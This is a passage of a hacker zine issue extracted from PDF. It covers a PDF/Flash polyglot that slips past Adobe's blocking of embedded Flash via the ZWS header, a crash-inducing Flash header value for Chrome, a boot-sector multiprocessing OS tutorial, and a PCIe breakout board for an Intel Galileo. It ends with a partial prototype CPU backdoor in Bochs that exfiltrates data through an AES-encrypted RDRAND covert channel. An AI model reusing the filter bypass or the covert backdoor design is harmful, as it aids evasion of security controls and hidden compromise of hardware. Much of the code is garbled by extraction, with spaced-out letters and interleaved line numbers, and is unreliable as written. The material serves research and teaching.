pressed Flash files, CWS for ZLIB compressed files and ZWS for LZMA compressed files. Maybe you’ve
guessed it already, but Adobe forgot to block the ZWS header. For now the file structure looks like this:
1 >>> s t r u c t u r e [ 0 : 3 ]
ZWS
3 >>> s t r u c t u r e [ 4 : ]
[ . . . F l a s h data . . . ] [ . . . PDF data . . . ]
Let’s move on to the PDF header.
5.4
The Missing PDF Header
The last thing missing is the PDF header. Let’s look in the Flash specification for a place. In the header the
length of the uncompressed Flash file is stored at offset 0x04, requiring four bytes. It seems to be useless,
as no Flash parser seems to use this field! This means we can overwrite it with the PDF header, but we
are missing one byte. The SWF specification defines at offset 0x03 the Flash version. Combined with the
following four-byte length field, we have a perfect place for the PDF header! Our header structure looks like
this.
>>> s t r u c t u r e [ 0 : 3 ]
2 ZWS
>>> s t r u c t u r e [ 3 : 8 ]
4 %PDF −
>>> s t r u c t u r e [ 8 : ]
6 [ . . . F l a s h data . . . ] [ . . . PDF data . . . ]
This is all it requires, but there is more!
4 As
harmless as PDF can be, at least!
155.5
The Madness
For unknown reasons the Flash file needs to be bigger than a certain size. I hard coded this size in my script.
If the Flash file is too small, the created polyglot won’t be rendered by the Adobe PDF reader, which makes
no sense. I tested the PDF/Flash polyglot across a number of different browsers, and the results are very
interesting. Please test it with your own systems.
• Windows 8 32 Bit:
– IE 11: PDF parsed, Flash not parsed
– Chrome: PDF parsed, Flash not parsed
– Firefox: PDF not parsed, Flash parsed
– Adobe Reader 11.0.07: PDF parsed
• Windows 7 64 Bit:
– IE 11: PDF parsed, Flash not parsed
– Chrome: PDF parsed, Flash parsed
– Firefox: PDF not parsed, Flash parsed
– Opera: PDF parsed, Flash parsed
– Adobe Reader 11.0.07: PDF parsed
• Windows 7 Enterprise 32 Bit:
– IE 11: PDF parsed, Flash parsed
– Chrome: PDF parsed, Flash not parsed
– Firefox: PDF not parsed, Flash parsed
– Adobe Reader 11.0.07: PDF parsed
As you can see, IE and Chrome are not consistent between different operating systems, which seems
really odd. But I have one little trick left!
5.6
Chrome Flash Player Crash!
While playing with the values of the Flash header I came across a crash in the 64 bit version of Chrome’s
Flash Player. At offset 0x0f and 0x10 a part of the dictionary size is stored. This is used in the LZMA
compression algorithm. Changing these to a high value like 0xBEEF will trigger a crash. Extending this crash
to an exploit, or determining that it isn’t exploitable, is left as an exercise for the reader.
>>> s t r u c t u r e [ 0 x 0 f : 0 x11 ]
2 ? (0 xbeef )
166
These Philosophers Stuff on 512 Bytes; or,
This Multiprocessing OS is a Boot Sector.
by Shikhin Sethi, Merchant of 3.5” Niftiness
The first article of this series 5 left the reader with a clean canvas, covering
the early initialization of a 80x86 CPU along with its memory management
unit. In the second installment, we will cover the x86 interrupts architecture,
and timer usage. We’ll also take a look at multiprocessing, how to handle
interrupt requests from devices with multiple CPUs at the helm, and finish
with a serving of stuffed philosophers–—in 512 bytes!
6.1
Privilege levels
To control the access of resources granted to any program, the x86 architecture, starting from the 80286,
features four privilege levels, level 0 to level 3, where 0 is the most privileged, and 3 is the least. Since
the privilege model follows a hierarchical ring-like system, each level is also known as a Ring. The Current
Privilege Level (CPL) is cached in the two lowest bits of the CS register, and is set as per the privilege level
in the Defined Privilege Level (DPL) field of the Code Segment Descriptor.
To control the programmed I/O privilege of any program, the I/O Privilege Level (IOPL) flag can be
used. A thread can only access I/O ports—and use certain privileged instructions—when its CPL is less than
or equal to the IOPL.
Traditionally, Ring 0 is used by the kernel while Ring 3 is used by user-level applications. Modern
microkernels can utilize Rings 1 and 2 to off-load drivers to a less privileged ring still granting I/O privileges.
6.2
Interrupts
In the event an external hardware needs to specify the occurrence of an event to the CPU, the hardware
emits a signal known as an Interrupt Request (IRQ). The CPU, based on the IRQ and an interrupt vector
table, then transfers control to an interrupt handler (interrupt service routine) associated with the IRQ. The
handler performs the requisite action, acknowledges the handling of the request to the device, and returns
execution back to the interrupted thread.
The same mechanism used to handle IRQs is further extended to accommodate both Exceptions and
System Calls.
• Exceptions: On facing any illegal instruction or operation, the processor raises an exception, corre-
sponding to a vector in the vector table. The Operating System can then either handle the exception,
or terminate execution of the faulting thread.
• System Calls: All modern architectures feature a special instruction to raise an interrupt, thus allowing
user-mode software to utilize the mechanism for calls into the kernel. For example, Linux uses the vector
0x80 on x86 for system calls.
The Interrupt Enable Flag (IF) in the (E)FLAGS register allows the kernel to mask hardware interrupts.
The instructions cli (clear interrupts) and sti (set interrupts) disable and enable hardware interrupts. Both
instructions are privileged as per what IOPL is set to.
6.2.1
Interrupt Vector Table (IVT)
Prior to the introduction of protected mode, the IVT was used to specify the address of all 256 interrupt
handlers. Each handler was represented by a 4-byte segment:offset pair, and the IVT is defaultly located at
0x0000:0x0000.
5 PoCkGTFO
4:3
17The 80286 introduced the lidt instruction, which also allowed the IVT to be relocated to another address
in conventional memory.
6.2.2
Interrupt Descriptor Table (IDT)
With protected mode, the IVT was superseded by the Interrupt Descriptor Table. Each entry in the IDT
was called a gate, and they were classified as:
• Interrupt Gates: The CPU pushes the EFLAGS register, the CS segment, and the return EIP on the
stack before handling control to the interrupt handler. Interrupts are automatically disabled upon
entry, and are restored when the EFLAGS register is popped back.
• Trap Gates: Trap gates are similar to interrupt gates, but interrupts are not masked upon entry.
• Task Gates: Task gates were intended to be used for hardware multitasking, but software multitasking
has been preferred over it.
Similar to the Global Descriptor Table Register, an IDTR is used to keep track of the size and location
of the IDT.
2
4
6
8
10
idtr :
; S i z e o f IDT − 1 .
dw ( 2 5 6 ∗ 8 ) − 1
dd i d t
; ecx : i n t e r r u p t v e c t o r .
; eax : t h e i n t e r r u p t h a n d l e r .
; Trash e d i .
add_idt_gate :
; The e n t r y i n t o t h e t a b l e .
l e a edi , [ i d t + ecx ∗ 4 ]
12
; The f i r s t two b y t e s s p e c i f y t h e l o w e r 16− b i t s o f t h e i n t e r r u p t h a n d l e r .
mov [ edi ] , ax
shr ax , 16
14
16
; The upper−most two b y t e s s p e c i f y t h e h i g h e s t 16− b i t s .
mov [ edi + 6 ] , ax
18
20
; The t h i r d and f o u r t h b y t e s p e c i f y t h e s e l e c t o r o f t h e i n t e r r u p t f u n c t i o n ,
; 0 x08 i n t h i s c a s e .
; The f i f t h b y t e i s r e s e r v e d 0 .
; The s i x t h b y t e i s f o r f l a g s :
;
B i t s 0 : 3 −> t y p e . 0x0E i s 32− b i t i n t e r r u p t g a t e .
;
B i t s 5 : 6 −> t h e p r i v i l e g e l e v e l t h e c a l l i n g d e s c r i p t o r s h o u l d h a v e .
;
B i t 7 −> p r e s e n t f l a g .
mov dword [ edi + 2 ] , 0 x08 | ( 1 << 3 1 ) | ( 0 x0E << 2 4 )
ret
22
24
26
28
6.2.3
Programmable Interrupt Controller (PIC)
To route hardware interrupts, the IBM PC and XT used the 8259 PIC chip which was able to handle 8 IRQs.
Traditionally, these were mapped by the BIOS to interrupts 8 to 15, so as to not collide with the original
exceptions.
With the IBM PC/AT, the system was extended to incorporate two 8259 PICs, where one acts as a
master and the other as a slave. Only the master is able to signal the processor, and the slave uses IRQ line
2 to signal to the master a pending interrupt. Since this implies that IRQ 2 is unavailable for use by devices,
most motherboards reroute IRQ 2 to IRQ 9 to maintain backwards compatibility.
18Both PIC chips have an offset variable. Whenever an unmasked input line is raised, they add the input
line to the offset, to form the requested interrupt number. By convention, the BIOS routes IRQs 0 to 7 to
interrupts 8 to 15, and IRQs 8 to 15 to interrupts 112 to 119. After handling an interrupt, the PIC chips need
a End Of Interrupt (EOI) command to ascertain that the interrupt isn’t pending. For interrupts cascaded
from the slave to the master, both the PIC chips need a EOI.
With the 80286, Intel extended exceptions to cover interrupt vectors 0x00 to 0x1F. Hence, the master
8259’s configuration collided with the exception range. To properly configure the PIC, both the master and
the slave controllers can be remapped with a proper offset. However, since we do not require any interrupts
from devices, we’ll mask all interrupt lines:
; Each b i t s p e c i f i e s each l i n e .
mov al , 0xFF
; For t h e master PIC.
out 0xA1 , a l
; For t h e s l a v e PIC.
out 0 x21 , a l
2
4
6
6.3
Programmable Interval Timer (PIT)
The x86 architecture features the Intel 8253/8254 as the de facto Programmable Interval Timer. The timer
has three channels with individual counters; the first was used for time keeping and got routed to IRQ 0.
The second channel was used to trigger the refresh of DRAM, while the third was used to program the PC
speaker. Each channel can be operated in any one of six modes. Although covering the entire functioning
of the 8253 is out of the scope of this article, we will take a specific look at programming channel 2 for a
one-shot timer.
The PIT uses an oscillator running at 1.19318166 MHz. The IBM PC borrowed from television circuitry
a single base oscillator at 14.31818 MHz. The CPU divided this by 3 for its frequency, while the CGA video
controller divided this by 4. Both the signals were passed through a logical AND gate to attain the frequency
for the PIT. A counter is used as a frequency divider to fine-tune the frequency provided by the PIT. The
counter is decreased using the base frequency, and a pulse is generated when it reaches zero.
The presence of a local APIC can be detected via the CPUID feature flags. Certain systems allow the
configuration of the LAPIC via a IA32_APIC_BASE Model-Specific Register (MSR). However, in most
cases, once the LAPIC is disabled via the MSR, it cannot be set without resetting the CPU.
Although the output of channel 2 is routed to the PC speaker, the channel offers a software-controllable
gate input, and allows us to check the output status without enabling interrupts. We will use channel 2 in
conjunction with mode 1, the hardware re-triggerable one-shot.
In mode 1, on the rising edge of the gate input, the timer reloads the current count with the value
specified. It sets the output signal as low, and on each falling edge of the oscillator, the value of the current
count is decremented. Once the current count reaches zero, the output signal goes high until the timer is
reset. The state of the output signal can be checked by I/O port 0x61.
2
4
6
; Port 0 x43 i s t h e command r e g i s t e r .
; 0 b −> 16− b i t b i n a r y mode , w h i l e s p e c i f y i n g t h e r e l o a d v a l u e .
; 001 b −> mode 1 , hardware re−t r i g g e r a b l e one−s h o t .
; 11 b −> l o b y t e / h i b y t e a c c e s s mode.
; 10 b −> c h a n n e l 2 .
mov al , 10110010 b
out 0 x43 , a l
8
10
12
; We s e t a f r e q u e n c y o f 100 Hz.
; 1193182/100 = 0 x2E9C.
; Low b y t e .
mov al , 0x9C
out 0 x42 , a l
1914
; High b y t e .
mov al , 0x2E
out 0 x42 , a l
16
The timer can then be started by raising the gate input:
; S t a r t t h e PIT c h a n n e l 2 t i m e r .
in al , 0 x61
and al , 0xFE
out 0 x61 , a l
or al , 1
out 0 x61 , a l
2
4
6
The output signal can also be determined:
in al , 0 x61
; Bit 5 s p e c i f i e s
and al , 0 x20
2
6.4
i f t h e o u t p u t i s h i g h or n o t .
Multiprocessing
With multiple processors, the interrupt routing mechanism is decoupled into two units: the local Advanced
Programmable Interrupt Controller (LAPIC) and the I/O APIC. Each LAPIC is integrated into the pro-
cessor 6 , and is used to manage external interrupts. The LAPIC is also used for generating Inter-Processor
Interrupts (IPI), which play a pivotal role in initializing other logical processors. The I/O APIC is used for
interrupt routing from external sources to a specific local APIC, and acts as a modern replacement for the
PIC.
Although the MultiProcessor Specification specifies the base of the local APIC as 0xFEE00000, the base
address can be overridden. Due to space constraints in our proof-of-concept, we assume the base address as
0xFEE00000. Each register in the local APIC memory space can only be accessed by a 32-bit read/write. 7
To handle certain race conditions, such as an interrupt being masked before it is dispensed, the local
APIC generates a spurious-interrupt. The spurious interrupt handler needs to be only set to a dummy
interrupt handler.
1
3
5
; B i t 8 e n a b l e s t h e LAPIC.
; Bits 0 to 7 s p e c i f y the vector of the spurious interrupt handler.
; We s e t i t t o 63 ( b i t s 0 t o 3 a r e h a r d w i r e d 1) .
mov e s i , l o c a l _ a p i c
mov dword [ l o c a l _ a p i c + s p u r i o u s _ i n t e r r u p t _ v e c t o r _ r e g i s t e r ] , ( 1 << 8 ) | ( 1 1 b << 4 )
6.4.1
Application Processor (AP) Start-Up
The logical processor that the BIOS hands control over to is termed as the bootstrap processor, while all
other processors in the system are called as application processors. Each AP is uniquely identified by a local
APIC ID assigned to its LAPIC.
6 The 80486 featured an external local APIC, the 82489DX. The 82489DX acted both, as the LAPIC and the I/O APIC, and
differs with the modern APIC in subtle ways. Systems with the 82489DX are rare, and the differences are beyond the scope of
this article.
7 For Family 5, Model 2, Stepping 0, 1, 2, 3, 4, and 11, writes to the local APIC registers can be lost. The bug can be avoided
by doing a dummy read from any local APIC register before a write.
20To initialize a logical processor, an INIT IPI is first sent to the respective local APIC. On receiving the
IPI, the LAPIC causes the processor to reset its state and start executing from a fixed location. After the
successful handling of the INIT IPI, a STARTUP IPI commands the processor to start executing from a
specified page. 8
1
3
mov
mov
mov
rep
si , trampoline
di , 0 x7000
cx , trampoline_end − t r a m p o l i n e
movsb
5
7
9
; Send t h e INIT I P I .
; 101 b −> INIT.
; 1 << 14 −> l e v e l .
; 11 b << 18 −> a l l e x c l u d i n g s e l f .
mov dword [ l o c a l _ a p i c + i c r _ l o w ] , ( 1 0 1 b << 8 ) | ( 1 << 1 4 ) | ( 1 1 b << 1 8 )
11
13
15
17
19
21
23
25
27
29
; S t a r t t h e PIT c h a n n e l 2 t i m e r .
in al , 0 x61
and al , 0xFE
out 0 x61 , a l
or al , 1
out 0 x61 , a l
.delay :
in al , 0 x61
; Bit 5 s p e c i f i e s
and al , 0 x20
jz .d elay
i f t h e o u t p u t i s h i g h or n o t .
; Send t h e S t a r t u p I P I .
; Vector XX s p e c i f i e s t h e page , g i v i n g t r a m p o l i n e a d d r e s s 0 x000XX000.
; In our case , 0 x 0 7 0 0 0 .
; 110 b −> S I P I .
mov dword [ l o c a l _ a p i c + i c r _ l o w ] , 7 | ( 1 1 0 b << 8 ) | ( 1 << 1 4 ) | ( 1 1 b << 1 8 )
In the trampoline, we initialize the AP with a stack, and switch to protected mode. In our revised
proof-of-concept, we’ve disabled paging due to space constraints, but no special logic is required to handle
that case either.
6.4.2
The MPS/ACPI Tables
Broadcasting INIT IPIs to all CPUs except the current one is not recommended; the BIOS may have
disabled specific faulty processors, which would also receive the IPI. Instead, the BIOS provides a list of all
local APICs with their local APIC ID. The MultiProcessor Specification (MPS) tables, or the Multiple APIC
Description Table (MADT) sub-table in the ACPI tables. 9 IPIs with the destination mode set as physical
and the destination field set with the specific LAPIC ID of the target processor can be used to initialize all
processors one by one.
6.4.3
LAPIC Timer
Each local APIC unit also has a specific timer, for per-CPU time keeping. However, the local APIC timer
operates on the CPU’s frequency, as opposed to the PIT which uses a fixed frequency. We first calibrate the
local APIC timer, and then configure it to periodically generate an interrupt every 10 ms.
8 The MultiProcessor Specification recommends that two successive SIPIs be sent with a delay of 200μs. However, not only
is it tough to find a timer with that precision, but most CPUs only require one SIPI. To be completely compliant, a second
SIPI can be sent after a small delay if the target CPU does not initialize itself by then.
9 The MPS tables are known to be faulty for modern systems, especially those supporting hyperthreading. Thus, the ACPI
tables are always recommended over the MPS ones.
211
; Though a l a r m i n g l y v e r s a t i l e , LAPIC e e r i l y e c h o e s n i c e s e n t i m e n t s o f
; l o t s of e f f o r t for l i t t l e gain.
; S e t t h e d i v i d e c o n f i g u r a t i o n r e g i s t e r as d i v i d e by 1 .
mov dword [ l o c a l _ a p i c + t i m e r _ d i v i d e _ c o n f i g ] , 1011 b
mov dword [ l o c a l _ a p i c + l v t _ t i m e r ] , 63
mov dword [ l o c a l _ a p i c + i n i t i a l _ c o u n t _ t i m e r ] , −1
3
5
7
; S t a r t t h e PIT c h a n n e l 2 t i m e r .
in al , 0 x61
and al , 0xFE
out 0 x61 , a l
or al , 1
out 0 x61 , a l
9
11
13
15
.delay :
in al , 0 x61
; Bit 5 s p e c i f i e s
and al , 0 x20
jz .d elay
17
19
21
i f t h e o u t p u t i s h i g h or n o t .
mov eax , [ l o c a l _ a p i c + c u r r e n t _ c o u n t _ t i m e r ]
not eax
mov [ i n i t i a l _ c o u n t ] , eax
23
25
mov dword [ l o c a l _ a p i c + t i m e r _ d i v i d e _ c o n f i g ] , 1011 b
; (1 << 17) s p e c i f i e s p e r i o d i c .
mov dword [ l o c a l _ a p i c + l v t _ t i m e r ] , 63 | ( 1 << 1 7 )
mov eax , [ i n i t i a l _ c o u n t ]
mov dword [ l o c a l _ a p i c + i n i t i a l _ c o u n t _ t i m e r ] , eax
27
29
6.4.4
I/O APIC
As opposed to the PIC, the peripheral to I/O APIC routing is not fixed. The MPS and ACPI tables specify
this routing. Covering the parsing of this routing is beyond the scope of this article.
6.5
Dining Philosophers
The philosophers have taught us that if you have a bite in front of you, synchronize the picking up your
forks and eat the bite. If you’ve got 512 bytes, eat all the damned 512 bytes.
The PoC has each CPU as a philosopher stuffing itself on its 512 bytes. On acquiring the forks, the CPU
executes the magic Bochs breakpoint instruction, ‘xchg bx, bx’ at 0x7D50. On losing the fork, it executes
‘xchg bx, bx’ at 0x7D39.
6.6
Till Next Time
The article got us through initializing our dining philosophers and making them eat. In future issues, we
will look at other aspects of the x86 architecture, including, but not limited to Non-Uniform Memory Access
(NUMA) systems.
Till next time,
1
3
hlt :
hlt
jmp h l t
227
A Breakout Board for Mini-PCIe; or,
My Intel Galileo has less RAM than its Video Card!
by Joe FitzPatrick
Dear Acolytes of Electricity, let us spend a moment remem-
bering the daily struggles from a time before enlightenment.
For let us not forget that there was a time that even the most
modest system upgrade required a screwdriver. And let us re-
call the dark moments when we were alone with DIP switches,
not knowing what to set or where to seek divine guidance.
Alas, device enumeration has come and we are saved. An
I for an O is not longer the rule of the land, but devices now
merely ask and they shall receive. The bounty of interrupts
and fruitfulness of MMIO are gifts granted upon enumeration,
a baptism into a new order of hardware that Just Works.
Beware, friends. There are those that would have us believe
that life is not easy. For we may still find need to open cases
with screwdrivers, align cards in slots, and insert cables with
retention clips. But this is merely a ruse! Deep down inside, it
is new and enlightened, but still lives and acts as it has since
the unenlightened times. Verily I tell you: there is a better
way. Let us liberate this hardware!
7.1
PCIe is as easy as USB
USB is great. We can plug stuff in, and it just works. If
we need more ports, we can use a hub. Down below there’s
differential signaling. There’s automatic speed negotiation. At
the higher layers there are standardized structures that report
all the INs and OUTs of the device. And these help software
know exactly which drivers to load when the device is attached
and identified.
PCIe is more similar than you might imagine. You plug
stuff in and it just works, though it sometimes requires a shut-
down. If you need more slots, you can use a switch. There’s
differential signaling automatic detection, and automatic speed
23and width negotiation. Standardized structures report the details of the device, and allow software to know
exactly which drivers to load.
The PCI SIG actually did a pretty darn good job with PCIe. They made it so that even if you screw
everything up with your hardware design, it’ll still probably work. Which also means we can screw around
with it, hack things together and it’ll still probably work too.
I have a divine vision I would like to share. I believe with all of my soul that, as long as we can get a
couple wires hooked up properly, we can bring any PCIe host and PCIe device together.
Before you all tell me to GTFO, I’ll get on with the PoC. Galileo is a board with a 400 MHz Pentium-class
processor that has been kluged into an Arduino form factor. It has a MiniPCIe slot on the bottom which
is supposed to only be used for Wifi adapters. But if I just stuck to what I was supposed to do I’d still be
flashing LEDs and saving my graphics cards for real computers.
7.2
An Incongruous Fornication of Hardware
So, the PoC is to get this Arduino working with a Geforce GTX 650 Ti Boost. Because a 1.1 GHz, 768-core
gpu with 2 GB of memory is a good mate to a 400 MHz single core CPU. First we’ll talk hardware, then
we’ll gloss over the software.
We’ve got a PCIe 3.0 x16 device—sixteen TX pairs and sixteen RX pairs that run up to 8 GHz on a 164
pin connector. When the device first connects, the physical layer figures out how wide the link is and scales
it down as necessary. In addition, the link starts at PCIe 1.0 speeds of 2.5 GHz and only ’retrains’ to a
higher speed if both ends support and the error rate stays low. Even at 2.5 GHz, we can do a crappy job
wiring it and our data rate might suck—but thanks to fancy protocols and error detection it will probably
still work.
So really, we only need four wires—two for TX and two for RX. Many devices work fine without a reference
clock, but we’ll throw in those extra 2 pins for good measure. The Galileo board has a MiniPCIe slot, and
we’ve got a full size PCIe card that’s five times the size of and twenty times the weight of the Galileo itself.
We need some way of cabling them together.
The PCI SIG actually defines external cables for PCIe, but they’re really expensive. Let’s brainstorm.
We need a cheap cable that can carry two 2.5 GHz pairs and one 100 MHz clock pair. hmm. USB 3 cables!
So, I threw together a couple boards—one to plug in the MiniPCIe slot, the other to plug the graphics card
into, and USB 3 sockets to connect them. The slot-end board also has a 12 V/5 V power header and voltage
regulator—MiniPCIe only supplies a little juice at 3.3 V while PCIe requires 12 V and 3.3 V. Pirate the
board files by unzipping this PDF. 10 You can get premade PCIe extenders/adapters like these on eBay or
elsewhere, but what’s the fun in that?
10 git
clone https://github.com/securelyfitz/PEXternalizer
241 r o o t @ c l a n t o n :~# l s p c i −k
00:00.0 Class 0600: 8086:0958
3 0 0 : 1 4 . 0 C l a s s 0 8 0 5 : 8 0 8 6 : 0 8 a7
00:14.1 Class 0700: 8086:0936
5 0 0 : 1 4 . 2 C l a s s 0 c03 : 8 0 8 6 : 0 9 3 9
0 0 : 1 4 . 3 C l a s s 0 c03 : 8 0 8 6 : 0 9 3 9
7 0 0 : 1 4 . 4 C l a s s 0 c03 : 8 0 8 6 : 0 9 3 a
00:14.5 Class 0700: 8086:0936
9 00:14.6 Class 0200: 8086:0937
00:14.7 Class 0200: 8086:0937
11 0 0 : 1 5 . 0 C l a s s 0 c80 : 8 0 8 6 : 0 9 3 5
0 0 : 1 5 . 1 C l a s s 0 c80 : 8 0 8 6 : 0 9 3 5
13 0 0 : 1 5 . 2 C l a s s 0 c80 : 8 0 8 6 : 0 9 3 4
0 0 : 1 7 . 0 C l a s s 0 6 0 4 : 8 0 8 6 : 1 1 c3
15 0 0 : 1 7 . 1 C l a s s 0 6 0 4 : 8 0 8 6 : 1 1 c4
00:1 f .0 Class 0601: 8086:095 e
17 0 1 : 0 0 . 0 C l a s s 0 3 0 0 : 10 de : 1 1 c2
0 1 : 0 0 . 1 C l a s s 0 4 0 3 : 10 de : 0 e0b
intel_qrk_sb
s d h c i −p c i
serial
e h c i −p c i
ohci_hcd
serial
stmmaceth
pcieport
pcieport
lp c _s ch
nouveau
So, plug everything in, attach an external power supply to the graphics card, power it up, and. . . nothing.
Or so it would seem. But, we’ve got a serial console on the Galileo, so we can check it out by running lspci.
And there we have it! An Nvidia 0x10de standing out in a sea of Intel 0x8086. Our graphics card is
connected, enumerated, and waiting for drivers.
7.3
Solemnization through Software
On a normal desktop, the BIOS starts up, runs the video BIOS that initializes the display, and gets on with
things. But this is supposed to be a tiny embedded system. While it does boot via EFI, it doesn’t run video
BIOS or any option ROMs. We’ll have to that by hand.
There’s already great instructions by Sergey Kiselev on how to build your own Linux for Galileo avail-
able. 11 I mostly followed those to get a standard install working, but I had to make two changes between
steps 7 and 8 of Kiselev’s tutorial. We need to add all the X11 related packages, and we need to enable
nouveau, the open-source Nvidia drivers, in our kernel configuration.
7 . 1 . Add ‘ ‘ x11 ’ ’ t o t h e DISTRO\_FEATURES l i n e i n
2 meta−c l a n t o n \_vxxxx/meta−c l a n t o n −d i s t r o / c o n f / d i s t r o / c l a n t o n −t i n y . c o n f
7 . 2 . C o n f i g u r e t h e k e r n e l by r u n n i n g ‘ ‘ b i t b a k e l i n u x −yocto−c l a n t o n −c
4 me nuc onfi g ’ ’ and e n a b l i n g nouveau under d r i v e r s −>g r a p h i c s −>nouveau
Copy the resulting files to a MicroSD card, pop it in your Galileo, and you are a modprobe nouveau
&& startx away from what might be the most inefficient way to drive a display ever devised. Of course,
there’s no window manager or input devices yet configured, so you can’t do much, but that’s just a software
problem, right?
11 http://www.malinov.com/Home/sergey-s-blog/intelgalileo-buildinglinuximage
25268
Prototyping a generic x86 backdoor in Bochs; or,
I’ll see your RDRAND backdoor and raise you a covert channel!
by Matilda
Inspired by Taylor Hornby’s article in PoCkGTFO 3:6 about a way to backdoor RDRAND, I designed
and prototyped a general backdoor for an x86 CPU that, without knowing a 128 bit AES key, can only be
proven to exist by reverse-engineering the die of the CPU.
In order to have a functioning backdoor we need several things. We need a context in which to execute
backdoor code and ways to communicate with the backdoor code. The first one is easy to solve. If we are
able to create new hardware on the CPU die, we can add an additional processor on it with a bit of memory
and have it be totally independent from any of the code that the x86 CPU executes. Let’s call this or its
Bochs emulation an Ubervisor.
We store the state for the ubervisor in an appropriately-named structure.
struct {
/∗ d a t a t o be e n c r y p t e d ∗/
u i n t 8 _ t e v i l b y t e =0 x f f ;
u i n t 8 _ t e v i l s t a t u s =0 x f f ;
/∗ c o u n t e r f o r o u t p u t c o v e r t c h a n n e l ∗/
uint64_t counter = 0 ;
/∗ i n c r e m e n t e d by 1 each time RDRAND
i s c a l l e d ∗/
uint64_t i_counter = 0 ;
/∗ each time we e n t e r ADD_GqEqR we e v a l u a t e
( (RAX << 64) | RBX) ^ AES_k( i _ c o u n t e r )
and i f i t g i v e s us t h e magic number we end
up i n c r e m e n t i n g i _ c o u n t e r t w i c e ( t o g e n e r a t e
256 b i t s o f keystream , as we r e a d 4 64 b i t
r e g s ) . I f we do n o t g e t t h e magic number ,
we ∗ do n o t ∗ i n c r e m e n t i _ c o u n t e r . t h i s a l l o w s
us t o remain i n s y n c h r o n i z a t i o n ∗/
/∗ k e y ∗/
u i n t 8 _ t aes_key [ 1 7 ] = "YELLOW SUBMARINE" ;
2
4
6
8
10
12
14
16
18
/∗ o u t p u t s t a t u s i s 0 i f we need t o o u t p u t t h e h i g h h a l f o f t h e
b l o c k , or 1 i f we need t o o u t p u t t h e low h a l f ( and t h e n i n c r e m e n t t h e
c o u n t e r a f t e r w a r d s , o f c o u r s e ) ∗/
uint8_t out_stat = 0 ;
} evil ;
20
22
Communicating with the backdoor is harder. We need to find out how to pass data from user mode x86
code to the ubervisor. No code running on the CPU—whether in user mode, kernel mode, or even SMM
mode—should be able to determine if the CPU is backdoored.
8.1
Data exfiltration using RDRAND as a covert channel.
Let’s first focus on communication from the ubervisor to user mode x86 code.
An obvious choice to sneak data from the ubervisor to user mode x86 code is using RDRAND. There
is no way, besides reverse engineering the circuits implementing RDRAND, to tell whether the output of
RDRAND is acting as a covert channel. All other instructions may be comparable to legitimate known-
good reference CPU values against a possibly-backdoored CPU, where all registers and memory are checked
after each instruction. RDRAND being non-deterministic by nature, it is not possible to perform the same
differential analysis to detect backdoors without reverting to more costly techniques, such as timing analysis.
Our implementation of an RDRAND covert channel goes in the Bochs function BX_CPU_C::RDRAND_-
Eq(bxInstruction_c *i).
271 B i t 6 4 u val_64 = 0 ;
uint8_t i b u f [ 1 6 ] ;
3 /∗ i n p u t b u f f e r i s o r g a n i z e d l i k e
8 b y t e s −− c o u n t e r
5
6 b y t e s of padding
1 b y t e −− e v i l s t a t u s
7
1 b y t e −− e v i l b y t e ∗/
uint8_t obuf [ 1 6 ] ;
9 AES_KEY k e y c t x ;
this :
11 AES_set_encrypt_key (BX_CPU_THIS_PTR e v i l . aes_key , 1 2 8 , &k e y c t x ) ;
13 memcpy ( i b u f ,
&(BX_CPU_THIS_PTR e v i l . c o u n t e r ) ,
8) ;
memset ( i b u f + 8 ,
0 xfe ,
6) ;
15 memcpy ( i b u f + 8 + 6 ,
&(BX_CPU_THIS_PTR e v i l . e v i l s t a t u s ) , 1 ) ;
memcpy ( i b u f + 8 + 6 + 1 , &(BX_CPU_THIS_PTR e v i l . e v i l b y t e ) ,
1) ;
17
AES_encrypt ( i b u f , obuf , &k e y c t x ) ;
19
i f (BX_CPU_THIS_PTR e v i l . o u t _ s t a t == 0 ) {
/∗ o u t p u t h i g h h a l f ∗/
21
memcpy(&val_64 , obuf , 8 ) ;
BX_CPU_THIS_PTR e v i l . o u t _ s t a t = 1 ;
23 } e l s e {
/∗ o u t p u t low h a l f ∗/
memcpy(&val_64 , o b u f + 8 , 8 ) ;
25
BX_CPU_THIS_PTR e v i l . o u t _ s t a t = 0 ;
BX_CPU_THIS_PTR e v i l . c o u n t e r ++;
27 }
29 BX_WRITE_64BIT_REG( i −>d s t ( ) , val_64 ) ;
Note that the output of RDRAND in the above code is AES k (noncekcounter), where we encode the data
we wish to exfiltrate in the nonce. The 64-bit counter is there just to make the output look random to anyone
who does not know the key. Unlike the standard uses of the counter mode, there is no xor-with-keystream
involved in our exfiltration at all; what we do is equivalent to using the CTR mode for encrypting a plaintext
of all zeros while transmitting actual data through the nonces.
The reason for this tweak is synchronization. Legitimate code may call RDRAND any number of times
between our own invocations. If we used the CTR mode to generate a keystream to XOR with the data
we exfiltrated, we would not be able to deduce the offset within the keystream given RDRAND values from
two sequential calls. With our nonce-based method, we suffer from no synchronization issues and retain all
security properties of the CTR mode.
Unless the counter overflows, the output of this version of RDRAND cannot be distinguished from random
data unless you know the AES key. Overflows can be avoided by incrementing the key just before the counter
overflows.
All we need now is to receive data from this covert channel as the output of two consecutive RDRAND
executions. In the rare case that the OS preempts us between the two RDRAND instructions to run
RDRAND for itself or another process, we need to try executing the two RDRANDs again. In practice, this
form of interruption has not been observed.
8.2
Data Infiltration to the Ubervisor
We now need to find a way for user mode x86 code to communicate data to the ubervisor while keeping it
impossible to detect it is doing so. First, we need to encrypt all the data we send to the ubervisor. Second,
we need a way to signal to the ubervisor that we would like to send it data.
I decided to hook the ADD_EqGqM function, which is called when an ADD operation on two 64 bit general
registers is decoded. In order to signal to the ubervisor that there is valid encrypted data in the registers, we
28put an encrypted magic cookie in RAX and RBX and test for it each time the hooked instruction is decoded.
If the magic cookie is found in RAX/RBX, we extract the encrypted data from RCX/RDX.
We encrypt the data with AES in counter mode, using a different counter than is used for the RDRAND
exfiltration. Again, we have a synchronization issue: how can we make sure we always know where the
ubervisor’s counter is? We resolve this by having the counter increment only when we see a valid magic
cookie and, of course, for each 128-bit chunk of keystream we generate afterwards (used to decrypt the data
we are sending to the ubervisor). That way, the ubervisor’s counter is always known to us, regardless of how
many times the hooked instruction is executed.
Note that CTR mode is malleable. If this were a production system, I would include a MAC and store
the MAC result in an additional register pair.
Here is the backdoored ADD_GqEqR function:
1 BX_INSF_TYPE BX_CPP_AttrRegparmN ( 1 ) BX_CPU_C : : ADD_GqEqR( b x I n s t r u c t i o n _ c ∗ i )
{
3
B i t 6 4 u op1_64 , op2_64 , sum_64 ;
uint8_t e r r o r = 1 ;
5
u i n t 8 _ t data = 0 x c c ;
uint8_t keystream [ 1 6 ] ;
7
